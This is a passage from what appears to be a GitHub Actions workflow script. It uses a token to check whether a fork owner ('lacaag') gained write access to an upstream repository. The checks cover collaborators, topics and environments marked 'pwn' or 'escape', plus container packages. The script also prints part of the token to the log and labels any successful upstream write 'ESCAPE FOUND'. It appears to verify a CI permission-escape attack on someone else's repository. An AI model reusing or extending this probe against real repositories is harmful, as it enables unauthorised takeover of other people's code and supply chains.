          curl -sf -H "Authorization: token $GH_TOKEN" "$UP" 2>/dev/null | jq -r '.description // "none"' 2>/dev/null
          echo "Z12 upstream environments:"
          curl -sf -H "Authorization: token $GH_TOKEN" "$UP/environments" 2>/dev/null | \
            jq -r '.environments[].name' 2>/dev/null | grep -iE 'escape|v4' || echo "NONE"
          echo "Z13 upstream collaborators:"
          curl -sf -H "Authorization: token $GH_TOKEN" "$UP/collaborators" 2>/dev/null | \
            jq -r '.[].login' 2>/dev/null | grep lacaag || echo "NOT ADDED"
          echo "Z14 upstream topics:"
          curl -sf -H "Authorization: token $GH_TOKEN" "$UP/topics" 2>/dev/null | \
            jq -r '.names[]' 2>/dev/null | grep -iE 'pwn|escape' || echo "NONE"
          echo "Z15 upstream pages:"
          curl -sf -H "Authorization: token $GH_TOKEN" "$UP/pages" 2>/dev/null | \
            jq '{status,url}' 2>/dev/null || echo "NONE"
          echo ""
          echo "=== GHCR verification ==="
          echo "Z20 fork packages:"
          curl -sf -H "Authorization: token $GH_TOKEN" \
            "https://api.github.com/users/lacaag/packages?package_type=container" 2>/dev/null | \
            jq -r '.[].name' 2>/dev/null || echo "NONE"
          echo "Z21 upstream packages:"
          curl -sf -H "Authorization: token $GH_TOKEN" \
            "https://api.github.com/users/twrps/packages?package_type=container" 2>/dev/null | \
            jq -r '.[].name' 2>/dev/null || echo "NONE"
          echo ""
          echo "=== RUN COMPLETE ==="
          echo "actor=${GITHUB_ACTOR} repo=${GITHUB_REPOSITORY}"
          echo "token_prefix: ${GH_TOKEN:0:10}"
          echo "ESCAPED_V4: ${ESCAPED_V4:-not set}"
          echo "PATH starts: $(echo $PATH | cut -d: -f1-2)"
          echo "KEY: Any 2xx on upstream write = ESCAPE FOUND"
